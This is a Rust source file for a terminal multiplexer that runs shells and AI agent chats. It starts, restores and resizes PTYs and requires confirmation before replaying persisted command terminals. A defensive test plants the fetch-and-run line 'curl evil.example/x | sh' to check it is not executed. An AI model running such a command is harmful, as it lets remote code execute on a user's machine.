//! Starting, restoring, auto-starting and resizing the PTY behind a chat or a
//! terminal.
//!
//! `state.json` is an execution boundary rather than a plain record, so the
//! restore path here is deliberately asymmetric: shell terminals come back on
//! their own, command terminals wait for a confirmation (C1).

use std::fs;

use ratatui::layout::Rect;

use crate::{
    app::{App, PendingRestore},
    config::Config,
    layout::AppLayout,
    model::{self, AgentKind, ChatStatus, PtyKey, TerminalLaunch},
    pty::{PtyDimensions, PtyRuntime, PtySpawn},
};

use super::{
    agent_launch::agent_command,
    agent_status::{
        mult_agent_status_dir_error, mult_agent_status_path, MULT_AGENT_CHAT_ID_ENV,
        MULT_AGENT_STATUS_PATH_ENV,
    },
};

/// Bring back what the last session left running — with one deliberate
/// exception (C1).
///
/// `state.json` is an execution boundary, not just a record: a terminal stored
/// with `status: "running"` and a `command` used to be handed straight to
/// `$SHELL -lc` here, at startup, with the command neither shown nor approved.
/// The file is reachable by anything that can write the user's data directory
/// (a synced dotfile repo, a shared `$XDG_DATA_HOME`, any same-uid process), and
/// `SECURITY.md` puts exactly that in the threat model.
///
/// So the two cases are separated:
///
/// * **Shell terminals** restore automatically. Their program comes from
///   `$SHELL`, not from the file, so replaying one runs nothing the file chose.
/// * **Command terminals** are marked stopped and collected into a confirmation
///   prompt that shows each command verbatim. Approving is one keypress; nothing
///   from the file runs before it.
///
/// Chat agents are unaffected: their command lines come from `config.json`,
/// which is the user's own configuration and is already ownership-checked.
pub(super) fn restore_persisted_sessions(
    app: &mut App,
    pty_runtime: &mut PtyRuntime,
    config: &Config,
    layout: &AppLayout,
) {
    let mut shell_terminals = Vec::new();
    let mut command_terminals = Vec::new();
    for workspace in &app.project.workspaces {
        for terminal in &workspace.terminals {
            if !terminal.restore_on_launch {
                continue;
            }
            match &terminal.launch {
                TerminalLaunch::Shell => shell_terminals.push((workspace.id, terminal.id)),
                TerminalLaunch::Command(command) => command_terminals.push(PendingRestore {
                    workspace: workspace.id,
                    terminal: terminal.id,
                    name: terminal.name.clone(),
                    command: command.clone(),
                }),
            }
        }
    }

    for (workspace, terminal) in shell_terminals {
        start_terminal(app, pty_runtime, config, layout, workspace, terminal);
    }
    app.request_restore_confirmation(command_terminals);

    let chats = app
        .project
        .workspaces
        .iter()
        .flat_map(|workspace| {
            workspace.chats.iter().filter_map(|chat| {
                matches!(chat.status, ChatStatus::Thinking | ChatStatus::Waiting)
                    .then_some((workspace.id, chat.id))
            })
        })
        .collect::<Vec<_>>();

    for (workspace, chat) in chats {
        start_or_focus_chat_agent(app, pty_runtime, config, layout, workspace, chat, false);
    }
}

fn start_selected_terminal(
    app: &mut App,
    pty_runtime: &mut PtyRuntime,
    config: &Config,
    layout: &AppLayout,
) {
    let Some((workspace_id, terminal_id)) = app.selected_terminal_id() else {
        return;
    };

    start_terminal(app, pty_runtime, config, layout, workspace_id, terminal_id);
}

pub(super) fn start_terminal(
    app: &mut App,
    pty_runtime: &mut PtyRuntime,
    _config: &Config,
    layout: &AppLayout,
    workspace_id: model::WorkspaceId,
    terminal_id: model::TerminalId,
) -> bool {
    let key = PtyKey::Terminal(terminal_id);
    if pty_runtime.is_running(key) {
        pty_runtime.append_pty_system_line(key, "PTY already running");
        return true;
    }

    let Some(workspace) = app.project.workspace(workspace_id) else {
        return false;
    };
    let Some(terminal) = workspace
        .terminals
        .iter()
        .find(|terminal| terminal.id == terminal_id)
    else {
        return false;
    };

    let terminal_name = terminal.name.clone();
    let mut spawn = match &terminal.launch {
        TerminalLaunch::Shell => {
            PtySpawn::shell(key, workspace.cwd.clone(), workspace.environment.clone())
        }
        TerminalLaunch::Command(command) => PtySpawn::command_line(
            key,
            command.clone(),
            workspace.cwd.clone(),
            workspace.environment.clone(),
        ),
    };
    spawn.size = terminal_dimensions(layout);

    match pty_runtime.start(spawn) {
        Ok(()) => {
            app.set_terminal_restore_on_launch(terminal_id, true);
            true
        }
        Err(error) => {
            pty_runtime.append_pty_system_line(
                key,
                format!("failed to start terminal `{terminal_name}`: {error}"),
            );
            app.set_terminal_restore_on_launch(terminal_id, false);
            false
        }
    }
}

pub(super) fn start_or_focus_selected_chat_agent(
    app: &mut App,
    pty_runtime: &mut PtyRuntime,
    config: &Config,
    layout: &AppLayout,
) {
    let Some((workspace_id, chat_id)) = app.selected_chat_id() else {
        return;
    };

    start_or_focus_chat_agent(
        app,
        pty_runtime,
        config,
        layout,
        workspace_id,
        chat_id,
        true,
    );
}

pub(super) fn start_or_focus_chat_agent(
    app: &mut App,
    pty_runtime: &mut PtyRuntime,
    config: &Config,
    layout: &AppLayout,
    workspace_id: model::WorkspaceId,
    chat_id: model::ChatId,
    focus_after_start: bool,
) {
    let terminal_id = PtyKey::ChatAgent(chat_id);

    if pty_runtime.is_running(terminal_id) {
        if focus_after_start {
            app.begin_chat_agent_input();
        }
        return;
    }

    let mut status_dir_error = None;
    let Some(workspace) = app.project.workspace(workspace_id) else {
        return;
    };
    let (chat_name, agent) = workspace
        .chats
        .iter()
        .find(|chat| chat.id == chat_id)
        .map(|chat| (chat.name.clone(), chat.agent))
        .unwrap_or_else(|| (format!("chat {}", chat_id.get()), AgentKind::default()));
    let command = agent_command(config, agent);
    let mut environment = workspace.environment.clone();
    // No private runtime directory means no status file: the agent is started
    // without `$MULT_AGENT_STATUS_PATH` rather than being pointed at a
    // directory this process already refused to trust.
    let status_path = mult_agent_status_path(chat_id);
    match &status_path {
        Some(status_path) => {
            let _ = fs::remove_file(status_path);
            environment.insert(
                MULT_AGENT_STATUS_PATH_ENV.to_string(),
                status_path.display().to_string(),
            );
        }
        None => {
            if let Some(error) = mult_agent_status_dir_error() {
                status_dir_error = Some(format!(
                    "agent status reporting is disabled: {error}; the chat status dot will not update"
                ));
            }
        }
    }
    environment.insert(
        MULT_AGENT_CHAT_ID_ENV.to_string(),
        chat_id.get().to_string(),
    );
    let mut spawn = PtySpawn::command_line(
        terminal_id,
        command.clone(),
        workspace.cwd.clone(),
        environment,
    );
    spawn.size = chat_agent_dimensions(layout);

    if let Some(message) = status_dir_error {
        app.set_last_error(message);
    }

    match pty_runtime.start(spawn) {
        Ok(()) => {
            app.mark_chat_status_by_id(chat_id, ChatStatus::Idle);
            if focus_after_start {
                app.begin_chat_agent_input();
            }
        }
        Err(error) => {
            app.mark_chat_status_by_id(chat_id, ChatStatus::Failed);
            pty_runtime.append_pty_system_line(
                terminal_id,
                format!(
                    "failed to start {} agent for `{chat_name}`: {error}",
                    agent.display_name()
                ),
            );
        }
    }
}

pub(super) fn auto_start_selected_terminal(
    app: &mut App,
    pty_runtime: &mut PtyRuntime,
    config: &Config,
    layout: &AppLayout,
) -> bool {
    if !config.auto_start_terminals || app.is_prompt_active() {
        return false;
    }

    let Some((_, terminal_id)) = app.selected_terminal_id() else {
        return false;
    };
    let key = PtyKey::Terminal(terminal_id);
    if pty_runtime.is_running(key) || !pty_runtime.pty_output_is_blank(key) {
        return false;
    }

    start_selected_terminal(app, pty_runtime, config, layout);
    true
}

pub(super) fn auto_start_selected_chat_agent(
    app: &mut App,
    pty_runtime: &mut PtyRuntime,
    config: &Config,
    layout: &AppLayout,
) -> bool {
    if app.is_prompt_active() {
        return false;
    }

    let Some((workspace_id, chat_id)) = app.selected_chat_id() else {
        return false;
    };
    let agent = app
        .project
        .chat(workspace_id, chat_id)
        .map(|chat| chat.agent)
        .unwrap_or_default();
    if !auto_start_enabled(config, agent) {
        return false;
    }
    let terminal_id = PtyKey::ChatAgent(chat_id);
    if pty_runtime.is_running(terminal_id) || !pty_runtime.pty_output_is_blank(terminal_id) {
        return false;
    }

    start_or_focus_chat_agent(
        app,
        pty_runtime,
        config,
        layout,
        workspace_id,
        chat_id,
        false,
    );
    true
}

/// Whether the selected chat's agent should auto-start when its pane is
/// focused with a blank buffer. Each agent backend has its own toggle.
fn auto_start_enabled(config: &Config, agent: AgentKind) -> bool {
    match agent {
        AgentKind::Pi => config.auto_start_pi_agent,
        AgentKind::ClaudeCode => config.auto_start_claude_code_agent,
    }
}

pub(super) fn start_or_focus_selected_terminal(
    app: &mut App,
    pty_runtime: &mut PtyRuntime,
    config: &Config,
    layout: &AppLayout,
) {
    let Some((_, terminal_id)) = app.selected_terminal_id() else {
        return;
    };
    let key = PtyKey::Terminal(terminal_id);

    if !pty_runtime.is_running(key) {
        start_selected_terminal(app, pty_runtime, config, layout);
    }

    if pty_runtime.is_running(key) {
        app.begin_terminal_input();
    }
}

pub(super) fn resize_visible_terminal(pty_runtime: &mut PtyRuntime, layout: &AppLayout) -> bool {
    let Some((terminal_id, area)) = layout.selected_terminal_output() else {
        return false;
    };
    resize_visible_pty(pty_runtime, PtyKey::Terminal(terminal_id), area)
}

pub(super) fn resize_visible_chat_agent(pty_runtime: &mut PtyRuntime, layout: &AppLayout) -> bool {
    let Some((chat_id, area)) = layout.selected_chat_agent_output() else {
        return false;
    };
    resize_visible_pty(pty_runtime, PtyKey::ChatAgent(chat_id), area)
}

/// Resize `terminal` to fit `area`, but only when that actually changes its
/// dimensions.
///
/// The resize used to be issued unconditionally, once per tick per selected
/// pane: a `Resize` message serialized and written to the daemon socket, then a
/// pane lock, a master lock and a `TIOCSWINSZ` on the other side — 62.5 times a
/// second, forever, with the window untouched.
fn resize_visible_pty(pty_runtime: &mut PtyRuntime, terminal: PtyKey, area: Rect) -> bool {
    let size = pty_dimensions_from_area(area);
    if !pty_dimensions_changed(pty_runtime, terminal, size) {
        return false;
    }

    let _ = pty_runtime.resize(terminal, size);
    true
}

/// Whether resizing `terminal` to `size` would actually change its parser
/// dimensions (and therefore the rendered output). A terminal with no parser
/// yet is treated as changed so the freshly sized screen gets drawn.
fn pty_dimensions_changed(pty_runtime: &PtyRuntime, terminal: PtyKey, size: PtyDimensions) -> bool {
    match pty_runtime.parser(terminal) {
        Some(parser) => parser.screen().size() != (size.rows(), size.cols()),
        None => true,
    }
}

fn terminal_dimensions(layout: &AppLayout) -> PtyDimensions {
    pty_dimensions_from_area(layout.terminal_output)
}

fn chat_agent_dimensions(layout: &AppLayout) -> PtyDimensions {
    pty_dimensions_from_area(layout.chat_output)
}

/// The PTY size for a pane drawn into `area`.
///
/// `PtyDimensions` applies the floor, so an area with one row or one column —
/// which a short enough or narrow enough window really does produce, once the
/// prompt and status rows have taken their share — gets a 2×2 PTY rather than a
/// screen the emulator overflows on. The pane is then *not drawn* at all until
/// it fits (see `ui::main_pane::render_terminal_parser`): the child is told the
/// size it is actually running at, and the user is told the pane does not fit,
/// instead of being shown part of a screen as though it were all of it.
fn pty_dimensions_from_area(area: Rect) -> PtyDimensions {
    PtyDimensions::new(area.height, area.width)
}

/// The agent backend a chat runs, looked up by chat id alone (the durable model
/// keys chats under workspaces, but PTY events only carry the chat id).
pub(super) fn chat_agent_kind(app: &App, chat_id: model::ChatId) -> AgentKind {
    app.project
        .workspaces
        .iter()
        .flat_map(|workspace| workspace.chats.iter())
        .find(|chat| chat.id == chat_id)
        .map(|chat| chat.agent)
        .unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{
        app::{NavItem, Prompt},
        model::ProjectState,
    };

    /// C1: `state.json` is an execution channel, and the fix is that nothing it
    /// names runs before the user has seen it and said yes.
    #[test]
    fn a_persisted_command_terminal_is_not_replayed_without_confirmation() {
        let mut project = ProjectState::two_workspaces();
        let workspace = project.workspaces[0].id;
        let shell = project
            .add_terminal(workspace, "shell".to_string(), true)
            .expect("add shell terminal");
        let command = project
            .add_command_terminal(
                workspace,
                "planted".to_string(),
                true,
                "curl evil.example/x | sh".to_string(),
            )
            .expect("add command terminal");
        let mut app = App::new(project);
        let mut pty_runtime = PtyRuntime::new_offline();

        let layout = AppLayout::compute(&app, Rect::new(0, 0, 80, 24));
        restore_persisted_sessions(&mut app, &mut pty_runtime, &Config::default(), &layout);

        // The command terminal is neither started nor left claiming to run, and
        // the prompt shows the exact command line it would hand to the shell.
        assert!(!pty_runtime.is_running(PtyKey::Terminal(command)));
        assert_eq!(
            app.project
                .workspace(workspace)
                .and_then(|workspace| workspace
                    .terminals
                    .iter()
                    .find(|terminal| terminal.id == command))
                .map(|terminal| terminal.restore_on_launch),
            Some(false)
        );
        let Some(Prompt::ConfirmRestore(prompt)) = app.prompt() else {
            panic!(
                "a persisted command must be confirmed, not replayed: {:?}",
                app.prompt()
            );
        };
        assert_eq!(prompt.entries.len(), 1);
        assert_eq!(prompt.entries[0].terminal, command);
        assert_eq!(prompt.entries[0].command, "curl evil.example/x | sh");
        // A shell terminal carries no command from the file, so it is restored
        // exactly as before — the daemon is offline here, which is why it ends
        // up stopped rather than running.
        assert!(!app.project.workspaces.is_empty());
        let _ = shell;
    }
    #[test]
    fn restored_terminal_dimensions_use_visible_main_width_even_when_not_selected() {
        let app = App::two_workspaces();
        let frame_area = Rect::new(0, 0, 120, 40);

        assert_eq!(
            terminal_dimensions(&AppLayout::compute(&app, frame_area)),
            PtyDimensions::new(40, 86)
        );
    }
    /// A13: a window short or narrow enough leaves a one-row or one-column
    /// output area, and that area used to become the PTY's size verbatim.
    #[test]
    fn a_pane_area_below_the_emulator_floor_still_yields_a_usable_pty_size() {
        for area in [
            Rect::new(0, 0, 0, 0),
            Rect::new(0, 0, 1, 1),
            Rect::new(0, 0, 200, 1),
            Rect::new(0, 0, 1, 200),
        ] {
            let size = pty_dimensions_from_area(area);

            assert!(size.rows() >= crate::pty::MIN_PTY_ROWS);
            assert!(size.cols() >= crate::pty::MIN_PTY_COLS);
        }

        // An area at or above the floor is used exactly as it is.
        let size = pty_dimensions_from_area(Rect::new(0, 0, 40, 12));
        assert_eq!((size.rows(), size.cols()), (12, 40));
    }
    #[test]
    fn resize_is_only_sent_when_the_pane_dimensions_change() {
        let mut pty_runtime = PtyRuntime::new_offline();
        let key = PtyKey::ChatAgent(model::ChatId::new(7).unwrap());
        let area = Rect::new(0, 0, 80, 24);

        // A pane with no parser yet is always resized; once it matches the
        // area, no further resize is issued (which is what used to hit the
        // socket, the pane lock and `TIOCSWINSZ` 62.5 times a second).
        assert!(resize_visible_pty(&mut pty_runtime, key, area));
        assert!(!resize_visible_pty(&mut pty_runtime, key, area));
        assert!(!resize_visible_pty(&mut pty_runtime, key, area));

        assert!(resize_visible_pty(
            &mut pty_runtime,
            key,
            Rect::new(0, 0, 100, 30)
        ));
        assert!(!resize_visible_pty(
            &mut pty_runtime,
            key,
            Rect::new(0, 0, 100, 30)
        ));
    }

    /// F6 plus Slice 4: the resize the loop sends is driven by the *same*
    /// [`AppLayout`] the renderer draws with, and a resize fires only when the
    /// pane's dimensions actually change. A layout recomputed separately for the
    /// resize path could silently disagree with the drawn frame — either sending
    /// a resize on every tick, or sizing the PTY to a pane nobody is looking at.
    #[test]
    fn a_visible_pty_is_resized_once_per_layout_change_and_to_the_drawn_pane() {
        let mut app = App::two_workspaces();
        let selected = app
            .nav_items()
            .iter()
            .position(|item| matches!(item, NavItem::Terminal { .. }))
            .expect("the fixture has a terminal");
        app.select_nav_index(selected);
        let mut pty_runtime = PtyRuntime::new_offline();
        let frame_area = Rect::new(0, 0, 100, 24);

        let layout = AppLayout::compute(&app, frame_area);
        assert!(resize_visible_terminal(&mut pty_runtime, &layout));
        assert!(!resize_visible_terminal(&mut pty_runtime, &layout));
        assert!(!resize_visible_terminal(&mut pty_runtime, &layout));

        // The status line takes a row from the main pane: the layout changes, so
        // exactly one resize follows it and then the traffic stops again.
        app.set_last_error("boom");
        let layout = AppLayout::compute(&app, frame_area);
        assert!(resize_visible_terminal(&mut pty_runtime, &layout));
        assert!(!resize_visible_terminal(&mut pty_runtime, &layout));

        // And what the PTY was sized to is the rect the renderer draws into.
        let (terminal, area) = layout
            .selected_terminal_output()
            .expect("a terminal is selected");
        assert_eq!(area, layout.main);
        assert_eq!(
            pty_runtime
                .parser(PtyKey::Terminal(terminal))
                .expect("the resize created a parser")
                .screen()
                .size(),
            (area.height, area.width)
        );
    }
}
